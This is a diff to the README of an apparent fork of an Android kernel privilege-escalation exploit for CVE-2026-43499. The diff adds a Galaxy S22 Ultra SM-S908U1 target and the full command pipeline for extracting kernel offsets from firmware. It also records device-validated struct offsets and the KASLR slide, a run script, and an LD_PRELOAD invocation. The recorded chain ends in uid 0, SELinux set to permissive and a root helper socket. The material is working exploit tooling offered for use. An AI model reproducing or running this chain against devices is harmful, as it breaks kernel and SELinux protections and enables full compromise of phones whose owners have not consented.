@@ -38,6 +38,7 @@ The following pre-configured target profiles are included in `src/targets/<TARGE
 | **Galaxy S22 Ultra** | SM-S908B | `S908BXXSNGZD7` | **Samsung Exynos 2200** | Android 16 | Europe / International |
 | **Galaxy S22 Ultra** | SM-S908E | `S908EXXSEGZE3` | **Qualcomm Snapdragon 8 Gen 1** | Android 16 | Global / Latin America / Asia / Africa |
 | **Galaxy S22 Ultra** | SM-S908E | `S908EXXSEGZH4` | **Qualcomm Snapdragon 8 Gen 1** | Android 16 | Global / Latin America / Asia / Africa |
+| **Galaxy S22 Ultra** | SM-S908U1 | `S908U1UEU8GYJ1` | **Qualcomm Snapdragon 8 Gen 1** | Android 16 | USA (Factory Unlocked) — *added in this fork* |
 | **Galaxy S22 Ultra** | SM-S908N | `S908NKSS9GZE5` | **Qualcomm Snapdragon 8 Gen 1** | Android 16 | South Korea |
 | **Galaxy S22 Ultra** | SM-S908W | `S908WVLS8FYG7` | **Qualcomm Snapdragon 8 Gen 1** | Android 15 | Canada (Baseline Profile) |
 | **Galaxy S22 Ultra** | SM-S908W | `S908WVLSAGZE3` | **Qualcomm Snapdragon 8 Gen 1** | Android 16 | Canada |
@@ -76,6 +77,80 @@ The upstream Apache License 2.0 is retained in [LICENSE](LICENSE), and attributi
   so dangling kernel references cannot be recycled into unrelated slab objects.
 - Runs failed race attempts in independent child processes and automatically
   retries with a device-tuned delay sequence.
+
+## Contributions in this fork
+
+This fork adds support for the **Galaxy S22 Ultra SM-S908U1 (USA, Factory
+Unlocked)** on firmware build **`S908U1UEU8GYJ1`** — the Snapdragon 8 Gen 1
+(taro) variant with the Android 16 / 5.10.236 GKI kernel.
+
+| | |
+| :--- | :--- |
+| Target | `src/targets/S908U1UEU8GYJ1` |
+| AP / CSC | `S908U1UEU8GYJ1` / `S908U1OYM8GYJ1` |
+| Kernel | `5.10.236-android12-9-31998796-abS908U1UEU8GYJ1` |
+| Fingerprint | `samsung/b0quew/b0q:16/BP2A.250605.031.A3/S908U1UEU8GYJ1:user/release-keys` |
+
+### How the target was produced
+
+Entirely with the repository's own `target_generator` pipeline — no offset was
+written by hand:
+
+```sh
+# 1. Firmware (SamFW "fac" package; zip md5 ddb9ca4289cc408c124bf09af7fb6631)
+unzip SAMFW.COM_SM-S908U1_XAA_S908U1UEU8GYJ1_fac.zip -d fw_meta
+tar xf fw_meta/AP_*.tar.md5 -C fw_extract boot.img.lz4
+lz4 -d fw_extract/boot.img.lz4 fw_extract/boot.img
+
+# 2. Samsung ships the kernel as a PE/COFF-wrapped ARM64 Image — magiskboot
+#    unwraps it into a flat `kernel` file whose offset 0 is also _text.
+magiskboot unpack fw_extract/boot.img
+
+# 3. The automated generator (kallsyms + ikconfig + capstone)
+cd target_generator
+gcc -O2 kallsyms.c -o kallsyms
+./kallsyms ../fw_extract/unpacked/kernel
+./extract-ikconfig ../fw_extract/unpacked/kernel > config.txt
+python3 generate_target.py kallsyms.txt config.txt ../fw_extract/unpacked/kernel \
+        --template target.h -o target.h
+
+# 4. Install into the target folder (sibling overrides from S901U1UESAGZH3 —
+#    same 5.10.236 GKI, same USA-unlocked carrier family)
+cp target.h ../src/targets/S908U1UEU8GYJ1/target.h
+
+# 5. Build
+make PROJECT=S908U1UEU8GYJ1 clean preload root-helper
+```
+
+### Validation performed on the physical device
+
+- Every dynamic offset cross-checked against the extracted `kallsyms`.
+- Struct layouts cross-checked against this kernel's own disassembly
+  (`rt_mutex_init_waiter` → `tree_entry@0x00` / `pi_tree_entry@0x18` /
+  `task@0x30`; `rt_mutex_adjust_prio_chain` → `waiter->lock@0x38`,
+  `->prio@0x40`, `->deadline@0x48`, `task->pi_blocked_on@0x898`,
+  `task->pi_lock@0x86c`, `task->pi_waiters@0x880`).
+- `mm_struct` slab geometry confirmed live on the device via `/proc/slabinfo`
+  (`objsize=960`, 34 objects/slab, 8 pages/slab → order-3).
+- KASLR slide recovery validated on the device: the tracefs probe returned
+  `slide=0x1b8000` (2 MB-aligned, as ARM64 KASLR requires), which confirms
+  the auto-derived `sched_blocked_reason` event id (84) and the
+  `worker_thread+0x558` caller offset are correct for this build.
+- Full chain completed on real hardware on the **first attempt**:
+  `cfi write/read ok → physrw read/write ok → uid=2000->0 → SELinux Permissive
+  → root helper socket up`.
+
+### Helper script
+
+`document/run-S908U1UEU8GYJ1.sh` wraps the whole flow (build → verify the
+embedded `exp32` blob → push → pre-flight → run → root check):
+
+```sh
+./document/run-S908U1UEU8GYJ1.sh            # 16 attempts, default delay sweep
+./document/run-S908U1UEU8GYJ1.sh slide      # KASLR-slide probe only (no race)
+./document/run-S908U1UEU8GYJ1.sh insmod     # + KernelSU-Next late load
+REBOOT_BEFORE_RUN=1 ./document/run-S908U1UEU8GYJ1.sh   # clean-slab reboot first
+```
 
 ## Build
 
@@ -134,6 +209,17 @@ Execute the exploit stage to start the root daemon:
 ```sh
 adb shell "LD_PRELOAD=/data/local/tmp/cve-2026-43499 sh"
 ```
+
+> [!TIP]
+> A bare `sh` leaves an **interactive** shell holding the adb pty, so `adb
+> shell` never returns even after the exploit has already succeeded — it just
+> looks hung. Run it non-interactively instead:
+>
+> ```sh
+> adb shell "LD_PRELOAD=/data/local/tmp/cve-2026-43499 sh -c ':'" </dev/null
+> ```
+>
+> Or type `exit` in the session to release it.
 
 Once successful, pop an interactive root shell from anywhere on the device:
 
